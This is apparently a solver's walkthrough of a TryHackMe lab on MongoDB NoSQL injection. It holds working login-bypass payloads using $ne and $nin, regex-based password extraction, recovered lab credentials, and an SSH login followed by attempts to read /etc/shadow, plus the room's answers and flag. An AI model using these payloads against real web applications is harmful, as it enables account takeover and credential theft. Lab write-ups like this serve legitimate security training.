---
A walkthrough depicting basic NoSQL injections on MongoDB.
---
![](https://i.imgur.com/1rvK8WH.jpg)


![222](https://tryhackme-images.s3.amazonaws.com/room-icons/a799d8a85c0b7381d17f860b0405b103.png)

###  NoSQL Basics

Before we can learn about NoSQL injection, let's first take a look at what MongoDB is and how it works.  

**MongoDB**

Much like MySQL, MariaDB, or PostgresSQL, MongoDB is another database where you can store data in an ordered way. MongoDB allows you to retrieve subsets of data in a quick and structured form. If you are familiar with relational databases, you can assume MongoDB works similarly to any other database. The major exception is that the information isn't stored on tables but rather in documents.  

You can think of these documents as a simple dictionary structure where key-value pairs are stored. In a way, they are very similar to what you would call a record on a traditional relational database, but the information is just stored differently. For example, let's say we are creating a web application for the HR department, and we would like to store basic employee information. You would then create a document for each employee containing the data in a format that looks like this:

`{"_id" : ObjectId("5f077332de2cdf808d26cd74"),"username" : "lphillips", "first_name" : "Logan", "last_name" : "Phillips", "age" : "65", "email" : "lphillips@example.com" }`  

As you see, documents in MongoDB are stored in an associative array with an arbitrary number of fields.  

MongoDB allows you to group multiple documents with a similar function together in higher hierarchy structures called collections for organizational purposes. Collections are the equivalent of tables in relational databases. Continuing with our HR example, all the employee's documents would be conveniently grouped in a collection called "people" as shown in the diagram below.  

![](https://i.imgur.com/Z3mI9BS.png)  

Multiple collections are finally grouped in databases, which is the highest hierarchical element in MongoDB. In relational databases, the database concept groups tables together. In MongoDB, it groups related collections.  

![](https://i.imgur.com/6rVIRNv.png)

Querying the database

As with any database, a special language is used to retrieve information from the database. Just as relational databases use some variant of SQL, non-relational databases such as MongoDB use NoSQL. In general terms, NoSQL refers to any way of querying a database that is not SQL, meaning it may vary depending on the database used.  

With MongoDB, queries use a structured associative array that contains groups of criteria to be met to filter the information. These filters offer similar functionality to a where clause in SQL and offer operators to build complex queries if needed.

To better understand NoSQL queries, let's start by assuming we have a database with a collection of people containing the following three documents:  

![](https://i.imgur.com/vGT21GY.png)

If we wanted to build a filter so that only the documents where the last_name is "Sandler" are retrieved, our filter would look like this:  

`**['last_name' => 'Sandler']**`

As a result, this query only retrieves the second document.

If we wanted to filter the documents where the gender is male, and the last_name is Phillips, we would have the following filter:

`**['gender' => 'male', 'last_name' => 'Phillips']**`

This would only return the first document.

If we wanted to retrieve all documents where the age is less than 50, we could use the following filter:

`**['age' => ['$lt'=>'50']]**`

This would return the second and third documents. Notice we are using the **$lt** operator in a nested array. Operators allow for more complex filters by nesting conditions. A complete reference of possible operators can be found on the following link:

[MongoDB Operator Reference](https://docs.mongodb.com/manual/reference/operator/query/) 

Answer the questions below

A group of documents in MongoDB is known as a...

*collection*

Using the MongoDB Operator Reference, find an operator to filter data when a field isn't equal to a given value

*$ne*

	Following the example of the 3 documents given before, how many documents would be returned by the following filter: ['gender' => ['$ne' => 'female'] , 'age' => ['$gt'=>'65'] ]

*0*


###  NoSQL injection

 Start Machine

﻿**Note:** Make sure to start your machine and navigate to http://MACHINE_IP to start the exercise.

  

**How to inject NoSQL**

When looking at how NoSQL filters are built, bypassing them to inject any payload might look impossible, as they rely on creating a structured array. Unlike SQL injection, where queries were normally built by simple string concatenation, NoSQL queries require nested associative arrays. From an attacker's point of view, this means that to inject NoSQL, one must be able to inject arrays into the application.  

Luckily for us, many server-side programming languages allow passing array variables by using a special syntax on the query string of an HTTP Request. For the purpose of this example, let's focus on the following code written in PHP for a simple login page:

![](https://i.imgur.com/MTWIydx.png)  

The web application is making a query to MongoDB, using the "**myapp**" database and "**login**" collection, requesting any document that passes the filter `**['username'=>$user, 'password'=>$pass]**`, where both **$user** and **$pass** are obtained directly from HTTP POST parameters

If somehow we could send an array to the **$user** and **$pass** variables with the following content:  

`**$user = ['$ne'=>'xxxx']**` 

`**$pass = ['$ne'=>'yyyy']**` 

The resulting filter would end up looking like this:  

`**['username'=>['$ne'=>'xxxx'], 'password'=>['$ne'=>'yyyy']]**`

We could trick the database into returning any document where the username isn't equal to '**xxxx**,' and the password isn't equal to '**yyyy**'. This would probably return all documents in the login collection. As a result, the application would assume a correct login was performed and let us into the application with the privileges of the user corresponding to the first document obtained from the database.

The problem that remains unsolved is how to pass an array as part of a POST HTTP Request. It turns out that PHP and many other languages allow you to pass an array by using the following notation on the POST Request Body:

`**user[$ne]=xxxx&pass[$ne]=yyyy**`

So let's fire up our favourite proxy and try to test this. For this guide we will be using Burp Proxy.


### Bypassing the Login Screen

Bypassing the login screen

First of all, let's open the website on [http://MACHINE_IP/](http://machine_ip/) and send an incorrect user/pass to capture the request on Burp:

![](https://i.imgur.com/d9Lv51m.png)  

The original captured login request looks like this:

![](https://i.imgur.com/ZTCWj9o.png)

We now proceed to intercept another login request and modify the user and pass variables to send the desired arrays:

![](https://i.imgur.com/56cyny2.png)

This forces the database to return all user documents and as a result we are finally logged into the application:

![](https://i.imgur.com/ZMJQB78.png)  

  

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.242.42 --ulimit 5500 -b 65535 -- -A -Pn

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.242.42:22
Open 10.10.242.42:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-01 15:00 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:00
Stats: 0:00:02 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE: Active NSE Script Threads: 1 (0 waiting)
NSE Timing: About 0.00% done
Completed NSE at 15:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:00
Completed NSE at 15:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:00
Completed NSE at 15:00, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:00
Completed Parallel DNS resolution of 1 host. at 15:00, 0.02s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:00
Scanning 10.10.242.42 [2 ports]
Discovered open port 22/tcp on 10.10.242.42
Discovered open port 80/tcp on 10.10.242.42
Completed Connect Scan at 15:00, 0.21s elapsed (2 total ports)
Initiating Service scan at 15:00
Scanning 2 services on 10.10.242.42
Completed Service scan at 15:00, 6.47s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.242.42.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:00
Completed NSE at 15:00, 5.62s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:00
Completed NSE at 15:00, 0.78s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:00
Completed NSE at 15:00, 0.00s elapsed
Nmap scan report for 10.10.242.42
Host is up, received user-set (0.21s latency).
Scanned at 2023-01-01 15:00:18 EST for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 695e4d9f42119832462db11fd2f893c6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoOYXqj7brvle0nCFw5/gdGwBjI2/fA5BZfEeMyXjUdzIU8T/4qoaYERKrdE2hVyWfdD/RESfvjSSCVVogskA4UdN4eExspK7vmLAVo18xyH9C0c8r7IpAvoZ6vpZiOan+5uZoN19mBZcP0GwkYWUw4LpeJn1QCvadnNB+3KuKgmgdBfZhZZsqPbIgPJ4xzWheA5rcDZYQRgEib5hsT5VsOXOHiF0vDZGxijjaj6c2MxgJHgvIFZSQxJEr97kgHP/EhIFYR+/P883aIntuzXJUeVPl2tuz2/vNA9UDicwkwcjsullkuqTCiN4TPADSWMGTnsyAH+6xXJEWcplfhyYr
|   256 6df8cffe210ee360d8a46e3457e6164a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN2ckBeOIDZpRuAiX1BwkmamRUVEbSODJhNYYWJzchEbhgk5cEYincGr7ziuzXJhWoMQcuT7UkAC21/QcMgmnOw=
|   256 05033daeaccc7a5889c8f24a350b4f3c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICznQ1AX5cSnmTWwuWNvhFRQYEOVH2iDTuj4nwrD8frK
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:00
Completed NSE at 15:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:00
Completed NSE at 15:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:00
Completed NSE at 15:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.80 seconds


user[$ne]=witty&pass[$ne]=witty1&remember=on

do intercept to this request

User:	admin
Password:	************
Full Name:	
email:	admin@nosql.int



```

![[Pasted image 20230101150357.png]]

![[Pasted image 20230101151209.png]]

When bypassing the login screen using the $ne operator, which user are you logged in as?

*admin*


### Logging in as Other Users

Logging in as other users

We have managed to bypass the application's login screen, but with the former technique, we can only login as the first user returned by the database. By making use of the $nin operator, we are going to modify our payload so that we can control which user we want to obtain.

First, the $nin operator allows us to create a filter by specifying criteria where the desired documents have some field, not in a list of values. So if we would want to log in as any user except for the user admin, we could modify our payload to look like this:

![](https://i.imgur.com/z2oTuR1.png)  

This would translate to a filter that has the following structure:

`**['username'=>['$nin'=>['admin'] ], 'password'=>['$ne'=>'aweasdf']]**`

Which tells the database to return any user for whom the username isn't admin and the password isn't aweasdf. As a result, we are now granted access to another user's account.

Notice that the $nin operator receives a list of values to ignore. We can continue to expand the list by adjusting our payload as follows:

![](https://i.imgur.com/jYM2KHZ.png)  

This would result in a filter like this:  

`**['username'=>['$nin'=>['admin', 'jude'] ], 'password'=>['$ne'=>'aweasdf']]**`

This can be repeated as many times as needed until we gain access to all of the available accounts.  

Answer the questions below

```
user[$nin][]=admin&pass[$ne]=witty1&remember=on

do intercept

User:	pedro
Password:	************
Full Name:	
email:	pcollins@nosql.int


user[$nin][]=admin&user[$nin][]=pedro&pass[$ne]=witty1&remember=on

do intercept

User:	john
Password:	************
Full Name:	
email:	jsmith@nosql.int

user[$nin][]=admin&user[$nin][]=pedro&user[$nin][]=john&pass[$ne]=witty1&remember=on

do intercept

error cz only there are 3 users

```


How many users are there in total?

*3*

There is a user that starts with the letter "p". What is his username?

*pedro*


### Extracting Users' Passwords

Extracting users' passwords

At this point, we have access to all of the accounts in the application. However, it is important to try to extract the actual passwords in use as they might be reused in other services. To accomplish this, we will be abusing the $regex operator to ask a series of questions to the server that allow us to recover the passwords via a process that resembles playing the game hangman.

First, let's take one of the users discovered before and try to guess the length of his password. We will be using the following payload to do that:

![](https://i.imgur.com/3QRR3Ei.png)Notice that we are asking the database if there is a user with a username of admin and a password that matches the regex: `**^.{7}$**`. This basically represents a wildcard word of length 7. Since the server responds with a login error, we know the password length for the user admin isn't 7. After some trial and error, we finally arrived at the correct answer:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/617be9330b818bf2ed2c31f779be7c17.png)  

We now know the password for user admin has length 5. Now to figure the actual content, we modify our payload as follows:  

![](https://i.imgur.com/8fHxIPu.png)

We are now working with a regex of length 5 (a single letter c plus 4 dots), matching the discovered password length, and asking if the admin's password matches the regex `^c....$` , which means it starts with a lowercase c, followed by any 4 characters. Since the server response is an invalid login, we now know the first letter of the password can't be "c". We continue iterating over all available characters until we get a successful response from the server:

![](https://i.imgur.com/7gqsCX6.png)

This confirms that the first letter of admin's password is 'a'. The same process can be repeated for the other letters until the full password is recovered. This can be repeated for other users as well if needed.

Answer the questions below

```
send to repeater 

getting pass admin

user=admin&pass[$regex]=^.{8}$&remember=on

Location: /sekr3tPl4ce.php

8 character

user=admin&pass[$regex]=^a.......$&remember=on

starts with a

user=admin&pass[$regex]=^ad......$&remember=on

ad

user=admin&pass[$regex]=^admin123$&remember=on

Location: /sekr3tPl4ce.php

so admin:admin123

User:	admin
Password:	************
Full Name:	
email:	admin@nosql.int

yep 

now for pedro then john :)

user=pedro&pass[$regex]=^.{11}$&remember=on

Location: /sekr3tPl4ce.php

11 characters

user=pedro&pass[$regex]=^c..........$&remember=on

starts with c

user=pedro&pass[$regex]=^coolpass123$&remember=on

Location: /sekr3tPl4ce.php

so pedro:coolpass123

let's see

User:	pedro
Password:	************
Full Name:	
email:	pcollins@nosql.int

yep :)

now john

user=john&pass[$regex]=^.{8}$&remember=on

8 characters

user=john&pass[$regex]=^10......$&remember=on

Location: /sekr3tPl4ce.php

starts with 1

user=john&pass[$regex]=^10584312$&remember=on

Location: /sekr3tPl4ce.php

john:10584312

User:	john
Password:	************
Full Name:	
email:	jsmith@nosql.int

:)

was really fun!

┌──(kali㉿kali)-[~]
└─$ ssh john@10.10.254.225                               
The authenticity of host '10.10.254.225 (10.10.254.225)' can't be established.
ED25519 key fingerprint is SHA256:V/8G3mpnlCv/7PyT/47/lXkPvwwFule0P6GZ7ZbqpAk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.254.225' (ED25519) to the list of known hosts.
john@10.10.254.225's password: 

Permission denied, please try again.
john@10.10.254.225's password: 
Permission denied, please try again.
john@10.10.254.225's password: 
john@10.10.254.225: Permission denied (publickey,password).

┌──(kali㉿kali)-[~]
└─$ ssh admin@10.10.254.225
admin@10.10.254.225's password: 
Permission denied, please try again.
admin@10.10.254.225's password: 
Permission denied, please try again.
admin@10.10.254.225's password: 
admin@10.10.254.225: Permission denied (publickey,password).

┌──(kali㉿kali)-[~]
└─$ ssh pedro@10.10.254.225
pedro@10.10.254.225's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-147-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Wed Jun 23 03:34:24 2021 from 192.168.100.250
pedro@nosql-nolife:~$ whoami;id
pedro
uid=1001(pedro) gid=1001(pedro) groups=1001(pedro)
pedro@nosql-nolife:~$ ls
flag.txt
pedro@nosql-nolife:~$ cat flag.txt
flag{N0Sql_n01iF3!}

pedro@nosql-nolife:~$ cat /etc/shadow
cat: /etc/shadow: Permission denied
pedro@nosql-nolife:~$ sudo -l
[sudo] password for pedro: 
Sorry, user pedro may not run sudo on nosql-nolife.
pedro@nosql-nolife:~$ find -perm -4000 2>/dev/null | xargs ls -lah
total 32K
drwxr-xr-x 3 pedro pedro 4.0K Jun 23  2021 .
drwxr-xr-x 4 root  root  4.0K Jun 23  2021 ..
lrwxrwxrwx 1 pedro pedro    9 Jun 23  2021 .bash_history -> /dev/null
-rw-r--r-- 1 pedro pedro  220 Jun 23  2021 .bash_logout
-rw-r--r-- 1 pedro pedro 3.7K Jun 23  2021 .bashrc
drwx------ 2 pedro pedro 4.0K Jun 23  2021 .cache
-rw-rw-r-- 1 pedro pedro   20 Jun 23  2021 flag.txt
-rw-r--r-- 1 pedro pedro  807 Jun 23  2021 .profile
-rw------- 1 pedro pedro  734 Jun 23  2021 .viminfo

┌──(kali㉿kali)-[~]
└─$ service apache2 start

and visit http://10.8.19.103/


```

What is john's password?

*10584312*

One of the users seems to be reusing his password for many services. Find which one and connect through SSH to retrieve the final flag!

*flag{N0Sql_n01iF3!}*



[[Atlassian, CVE-2022-26134]]